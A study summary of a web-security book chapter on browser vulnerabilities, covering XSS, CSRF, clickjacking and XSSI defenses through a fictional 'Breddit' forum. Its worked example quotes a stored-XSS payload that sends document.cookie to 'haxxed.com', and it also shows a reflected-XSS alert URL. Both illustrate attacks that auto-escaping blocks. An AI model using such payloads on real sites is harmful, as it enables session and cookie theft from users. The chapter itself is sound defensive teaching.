# Chapter 6: Browser Vulnerabilities

## Core Idea
Because browsers execute untrusted JavaScript by design, they are the primary attack surface against your users — cross-site scripting (stored, reflected, DOM-based), cross-site request forgery, clickjacking, and cross-site script inclusion all exploit gaps between what a page's HTML/JS *should* do and what an attacker can make it do, and each has a specific, layered defense.

## Frameworks Introduced
- **XSS defense via context-aware escaping**: Removing/replacing HTML metacharacters in any untrusted content before it's written into the page.
  - When to use: Anywhere dynamic (user-supplied or URL-derived) content is interpolated into HTML, in any of the three XSS variants (stored, reflected, DOM-based).
  - How: Rely on your templating engine's default auto-escaping; never disable it (`| safe`, `autoescape false`) without manually re-implementing equivalent escaping; audit any helper function that constructs raw HTML strings outside the template system, since these are commonly missed in reviews.
- **CSRF defense via GET-safety + anti-CSRF tokens + SameSite**: A three-layer defense stack against tricking a user's browser into making an unwanted authenticated request.
  - When to use: On every state-changing (POST/PUT/DELETE) endpoint that relies on cookie-based session auth.
  - How: (1) Ensure GET requests never have side effects — this alone defeats the simplest CSRF vector. (2) Add a per-session anti-CSRF token embedded in forms/headers and mirrored in a cookie or session store, rejecting requests where the two don't match. (3) Set `SameSite=Lax` (or `Strict` for high-sensitivity sites) on session and CSRF cookies so cross-site requests arrive without them at all. Layer all three — SameSite alone depends on correct browser implementation, so don't treat it as sufficient on its own.
- **Clickjacking defense via frame-ancestors**: Preventing your site from being loaded inside another site's invisible iframe.
  - When to use: On every page that performs a sensitive action a user could be tricked into triggering via a disguised click.
  - How: Set `Content-Security-Policy: frame-ancestors 'none'` (or `'self'`/a specific allow-list of trusted embedders); fall back to the older `X-Frame-Options: DENY` header for legacy browser support.
- **XSSI defense via out-of-band token delivery**: Never embedding user-specific secrets directly in JavaScript files, because JS (unlike JSON/HTML) is not subject to the same-origin policy when imported cross-domain.
  - When to use: Whenever a page needs to hand a per-user secret (access token, API key) to client-side code.
  - How: Fetch the token via an authenticated JSON API call (protected by same-origin) or embed it in an HTML `<meta>` tag and read it via DOM query — never bake it into a `.js` file body; additionally set `Cross-Origin-Resource-Policy: same-origin` on JS responses where feasible.

## Key Concepts
- **Stored XSS**: Malicious JavaScript persisted in the database (e.g., a comment) and executed for every subsequent viewer of that content — the most dangerous XSS variant because of its many-victims blast radius.
- **Reflected XSS**: Malicious JavaScript delivered via the HTTP request itself (e.g., a search query parameter echoed back into the results page), requiring the victim to click a crafted link.
- **DOM-based XSS**: An XSS variant driven entirely by the URI fragment (the part after `#`), which browsers never send to the server — making this variant invisible in server logs.
- **Cross-Site Request Forgery (CSRF)**: Tricking a user's authenticated browser into submitting a request the user didn't intend, exploiting the fact that cookies are attached automatically.
- **Anti-CSRF token**: A randomly generated, per-session value embedded in both a form field and a cookie/session store; a request is only trusted if both copies match, since an attacker's cross-origin form can't read the cookie value.
- **Clickjacking**: Layering an invisible, higher z-index element over an embedded iframe so a user's click is captured by the attacker's page instead of the framed content.
- **X-Frame-Options**: The older, single-purpose predecessor to CSP's `frame-ancestors` directive for controlling framing.
- **Cross-Site Script Inclusion (XSSI)**: Exploiting the fact that JavaScript files are importable cross-domain (unlike JSON/HTML) to harvest embedded per-user secrets from a script.
- **Cross-Origin Resource Policy (CORP)**: A response header (`Cross-Origin-Resource-Policy: same-origin`) restricting which origins may load a given resource, used as an XSSI mitigation.

## Mental Models
- Treat escaping as the first line of defense and CSP as the second: even a template engine's default auto-escape can be bypassed by an overlooked raw-HTML helper function, so a `script-src` CSP without `unsafe-inline` still blocks execution of any injected `<script>` tag that slips through.
- Think of the three XSS variants as differing in *where the untrusted content lives*: stored (database), reflected (request parameters), DOM-based (URL fragment, browser-only, invisible server-side) — the fix (escaping at the point of interpolation) is the same in all three, but the audit surface (where to look for the bug) differs.
- Think of SameSite as "the browser's best effort," not a self-sufficient guarantee: it depends on correct client implementation across all supported browsers, so pairing it with anti-CSRF tokens covers the case where SameSite is absent, misconfigured, or not yet honored.
- Treat clickjacking as literally a UI layering trick (z-index + opacity:0), not a code-execution vulnerability — the fix is equally about controlling *where your page can be embedded*, not about validating input.

## Anti-patterns
- **GET requests with side effects**: Any state-changing action reachable via GET is trivially triggerable by an `<img>` tag or bare hyperlink — a CSRF vulnerability by construction (echoes chapter 4).
- **Disabling template auto-escape without manual re-escaping**: `{% autoescape false %}` or `| safe` reintroduces raw HTML injection unless the developer explicitly escapes elsewhere.
- **Embedding access tokens directly in `.js` files**: JavaScript files bypass the same-origin policy on cross-domain import, so any secret baked into a script body is harvestable by any site that imports it.
- **Relying solely on SameSite for CSRF protection**: A single point of failure if the attribute is dropped, misconfigured, or the browser doesn't honor it as expected — always pair with anti-CSRF tokens.
- **Overlooking reflected XSS in search/error pages**: These are commonly missed in security reviews because the vulnerable code path looks like ordinary "echo the user's input back" functionality rather than an obvious injection point.

## Code Examples
```html
<!-- Reflected XSS via search query parameter -->
https://www.breddit.com/search/<script>alert('Your%20dough%20is%20tough')</script>
```
```python
# Flask/Jinja2 auto-escaping (default): safe
{{ comment }}
# Renders "<script>...</script>" as literal escaped text, not an executable tag

# Explicitly disabling auto-escape: dangerous unless manually re-escaped
{% autoescape false %}
<div class="comment">{{ comment }}</div>
{% endautoescape %}
```
- **What it demonstrates**: The difference between default-safe templating and an explicit opt-out that reintroduces the XSS vector.

```html
<!-- Anti-CSRF token pattern -->
<form method="post" action="/comment">
  <input type="hidden" name="csrf_token" value="3c1a48bf80874a59" />
</form>
```
```
Set-Cookie: csrf_token=3c1a48bf80874a59
```
- **What it demonstrates**: The token appears in both the form body and a cookie; a cross-origin attacker's form can supply the body value (if guessed) but cannot read/set the matching cookie, so the server rejects mismatches.

```
Set-Cookie: session_id=2308797c-348a-4939-9049; SameSite=Lax
```
```
Content-Security-Policy: frame-ancestors 'none'
```
```
X-Frame-Options: DENY
```
- **What it demonstrates**: Layered CSRF (SameSite) and clickjacking (frame-ancestors / X-Frame-Options) defenses as simple header/attribute additions.

```javascript
// XSSI-safe token delivery: authenticated fetch instead of embedding in a .js file
fetch('https://breddit.com/api/chat/token')
  .then(response => response.json())
  .then(data => {
    chatbox.init({ client_id: "BREDDIT.COM", user_access_token: data.access_token });
  });
```
- **What it demonstrates**: Fetching a per-user secret via a same-origin-protected JSON endpoint instead of baking it into a cross-domain-importable script file.

## Reference Tables
| Vulnerability | Where untrusted content originates | Visible in server logs? | Primary defense |
|---|---|---|---|
| Stored XSS | Database (persisted user content) | Yes | Escape output; CSP |
| Reflected XSS | HTTP request parameters | Yes | Escape output; CSP |
| DOM-based XSS | URI fragment (`#...`) | No — fragment never sent to server | Escape output; CSP |
| CSRF | Cross-site request carrying cookies | Yes (but looks legitimate) | GET side-effect-free; anti-CSRF tokens; SameSite |
| Clickjacking | Invisible iframe overlay | N/A (client-side UI trick) | `frame-ancestors`; `X-Frame-Options` |
| XSSI | Cross-domain `<script>` import | Yes (script request logged) | No secrets in JS files; CORP |

## Worked Example
Walk through securing the Breddit comment feature end-to-end against every vulnerability in this chapter.

1. **Stored XSS in comments**: A user (Mr. Crunch) submits a comment containing `<script>window.location='haxxed.com?cookie='+document.cookie</script>`. Because the comment template uses Jinja2's default auto-escaping (`{{ comment }}` without `| safe`), the script tag is rendered as literal text (`&lt;script&gt;...`) in every other viewer's page — never executed. The team confirms no helper function elsewhere renders comments via a raw-HTML path that bypasses this.
2. **Reflected XSS in search**: The forum's recipe search echoes the query term into the results heading ("Results for: <em>{{ query }}</em>"). Because this uses the same auto-escaped template variable, a crafted URL like `/search/<script>...</script>` is neutralized identically. The team adds this page to their security review checklist explicitly, since reflected XSS bugs in search/error pages are the ones most often missed.
3. **CSRF on comment submission**: The comment form was originally implemented as `<form action="/comment/new" method="get">` — meaning anyone could trigger a comment post merely by clicking a link, including a self-replicating "worm" comment containing a link back to itself. The team fixes this in three layers: (a) changes the verb to POST, immediately requiring an attacker to get a victim to submit a cross-origin form rather than just click a link; (b) adds Flask-WTF's `CSRFProtect`, embedding a `csrf_token` hidden field validated against a matching cookie; (c) sets `SameSite=Lax` on the session cookie so cross-site POSTs arrive without it at all, redirecting the attacker's forged request to a login page instead of executing as the victim.
4. **Clickjacking on the account-settings page**: Because account settings include a "delete account" button, the team adds `Content-Security-Policy: frame-ancestors 'none'` to that page's response headers (plus `X-Frame-Options: DENY` for older browser compatibility), preventing any other site from embedding it in an invisible iframe to hijack clicks.
5. **XSSI on the embedded chat widget**: The forum's third-party chat integration originally hardcoded `user_access_token: "clovis-394688478521"` directly inside a generated `chat.js` file — any external site could `<script src="https://breddit.com/chat.js">` and harvest every visiting user's token. The team migrates this to an authenticated `fetch('/api/chat/token')` JSON call and adds `Cross-Origin-Resource-Policy: same-origin` to the JS file's response headers as an additional layer.

Result: every vulnerability class in the chapter is addressed with its specific, layered defense — no single header or escaping call is asked to do more than one job.

## Key Takeaways
1. Escape all dynamic content at the point of HTML interpolation; treat any disabled auto-escape (`| safe`, `dangerouslySetInnerHTML`) as requiring manual, audited re-escaping.
2. Layer CSP (`script-src` without `unsafe-inline`) even after escaping — it's a second independent barrier against injected scripts.
3. Never use GET for state-changing actions; combine anti-CSRF tokens with `SameSite` cookies rather than relying on either alone.
4. Use `frame-ancestors` (with `X-Frame-Options: DENY` as legacy fallback) on any page performing sensitive user-triggered actions, to prevent clickjacking.
5. Never embed user-specific secrets in JavaScript files — JS bypasses the same-origin policy on cross-domain import; use an authenticated fetch or a `<meta>` tag instead, and add CORP as an extra layer.
6. DOM-based XSS via the URI fragment is invisible in server logs — audit client-side rendering code, not just server templates, when hunting for this variant.
7. Reflected XSS is disproportionately missed in reviews because it hides in ordinary-looking "echo user input" features like search and error pages.

## Connects To
- **Ch 2**: Directly builds on the CSP, same-origin policy, and cookie-attribute (Secure/HttpOnly/SameSite) primitives introduced there, applying them as concrete attack mitigations here.
- **Ch 4**: The GET-side-effect-free principle and output-escaping discipline from Web Server Security are the root causes this chapter's CSRF and XSS sections build defenses around.
- **Ch 12 (external)**: The book's dedicated Injection Vulnerabilities chapter extends the escaping discipline introduced here (for HTML) to SQL and command contexts in more depth.
